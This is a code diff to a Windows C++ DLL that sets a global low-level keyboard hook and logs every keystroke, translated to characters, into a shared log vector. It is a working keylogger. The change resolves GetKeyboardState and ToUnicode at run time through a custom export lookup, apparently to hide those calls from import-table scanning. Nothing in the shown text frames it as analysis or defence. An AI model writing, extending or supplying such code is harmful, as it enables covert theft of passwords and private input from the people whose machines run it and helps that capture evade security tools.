@@ -19,10 +19,14 @@ void* FindExportAddress(HMODULE hModule, const char* funcName);
 typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
 typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
 typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);
+typedef BOOL(WINAPI *GetKeyboardStateFn)(PBYTE);
+typedef int(WINAPI *ToUnicodeFn)(UINT, UINT, PBYTE, LPWSTR, int, UINT);
 
 SetWinHookFn MySetWindowsHookEx;
 UnhookWinHookExFn MyUnhookWindowsHookEx;
 CallNxtHookExFn MyCallNextHookEx;
+GetKeyboardStateFn MyGetKeyboardState;
+ToUnicodeFn MyToUnicode;
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -56,6 +60,8 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
     MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
     MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
+    MyGetKeyboardState = (GetKeyboardStateFn)FindExportAddress(hUser32, "GetKeyboardState");
+    MyToUnicode = (ToUnicodeFn)FindExportAddress(hUser32, "ToUnicode");
 
     sharedLogVector = logVector;  
     k_Hook = MySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
@@ -63,7 +69,11 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 
 DLL_EXPORT void Cleanup()
 {
-    if (k_Hook) MyUnhookWindowsHookEx(k_Hook);
+    if (k_Hook) 
+    {
+        MyUnhookWindowsHookEx(k_Hook);
+        k_Hook = nullptr;
+    }
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -72,7 +82,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
         KBDLLHOOKSTRUCT* k_Info = (KBDLLHOOKSTRUCT*)lParam;
         BYTE k_State[256];
-        GetKeyboardState(k_State);
+        MyGetKeyboardState(k_State);
         WCHAR outputChar[2] = { 0 };
 
         {
@@ -204,7 +214,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                             break;
                         default:
                         {
-                            int result = ToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
+                            int result = MyToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
                             if (result == 1)
                             {
                                 std::string utf8Char(1, (char)outputChar[0]); 
